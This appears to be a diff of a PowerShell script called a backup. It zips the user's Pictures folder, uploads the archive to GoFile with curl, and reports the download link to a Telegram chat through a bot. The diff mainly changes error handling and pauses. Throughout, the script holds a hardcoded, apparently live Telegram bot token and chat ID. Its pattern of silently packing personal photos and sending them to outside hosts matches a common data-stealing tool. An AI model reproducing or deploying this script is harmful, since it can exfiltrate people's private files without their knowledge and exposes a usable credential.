@@ -1,6 +1,7 @@
 # ========================================
 #            CONFIGURATION
 # ========================================
+# UPDATE THESE BEFORE UPLOADING TO GITHUB
 $BotToken       = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
 $ChatId         = "2146236602"
 
@@ -9,7 +10,6 @@ $PicturesFolder = "$env:USERPROFILE\Pictures"
 $ZipFile        = "$env:TEMP\Pictures_Backup.zip"
 # ========================================
 
-Clear-Host
 Write-Host "--- STARTED BACKUP PROCESS ---" -ForegroundColor Magenta
 
 # 1. ZIP THE FOLDER
@@ -21,7 +21,9 @@ try {
 }
 catch {
     Write-Host "[-] ZIP creation failed: $_" -ForegroundColor Red
-    exit
+    # PAUSE HERE INSTEAD OF EXITING
+    Read-Host "Press Enter to stop..."
+    return
 }
 
 # 2. GET GOFILE SERVER
@@ -33,16 +35,16 @@ try {
 }
 catch {
     Write-Host "[-] Failed to get GoFile server. API might be down." -ForegroundColor Red
-    Remove-Item $ZipFile -Force -ErrorAction SilentlyContinue # Cleanup if we fail here
-    exit
+    Read-Host "Press Enter to stop..."
+    return
 }
 
 # 3. UPLOAD ZIP (Using Curl)
 Write-Host "[3/4] Uploading to server ($server)..." -ForegroundColor Cyan
 if (-not (Test-Path "$env:SystemRoot\System32\curl.exe")) {
     Write-Host "[-] Curl.exe not found." -ForegroundColor Red
-    Remove-Item $ZipFile -Force # Cleanup
-    exit
+    Read-Host "Press Enter to stop..."
+    return
 }
 
 $curlOutput = & "$env:SystemRoot\System32\curl.exe" -s -F "file=@$ZipFile" "https://$server.gofile.io/uploadFile"
@@ -56,8 +58,10 @@ try {
 }
 catch {
     Write-Host "[-] Upload failed." -ForegroundColor Red
-    Remove-Item $ZipFile -Force # Cleanup
-    exit
+    Write-Host "Debug Info: $curlOutput" -ForegroundColor Gray
+    Remove-Item $ZipFile -Force
+    Read-Host "Press Enter to stop..."
+    return
 }
 
 # 4. SEND TO TELEGRAM & DELETE ZIP
@@ -75,15 +79,13 @@ try {
         
     Write-Host "      Notification sent." -ForegroundColor Green
 
-    # === DELETE FILE HERE (Only runs if the lines above succeeded) ===
-    Write-Host "      Deleting temporary zip file..." -NoNewline
+    # DELETE ZIP AFTER SUCCESS
     Remove-Item $ZipFile -Force -ErrorAction SilentlyContinue
-    Write-Host "Done." -ForegroundColor Green
 }
 catch {
     Write-Host "[-] Failed to send Telegram message: $_" -ForegroundColor Red
-    # Depending on your preference, you might still want to keep the file if sending failed
-    # or delete it anyway. Currently, it keeps the file if Telegram fails so you don't lose the upload.
 }
 
 Write-Host "`n[✓] All Done." -ForegroundColor Green
+# FINAL PAUSE SO YOU CAN SEE THE RESULT
+Read-Host "Press Enter to close..."
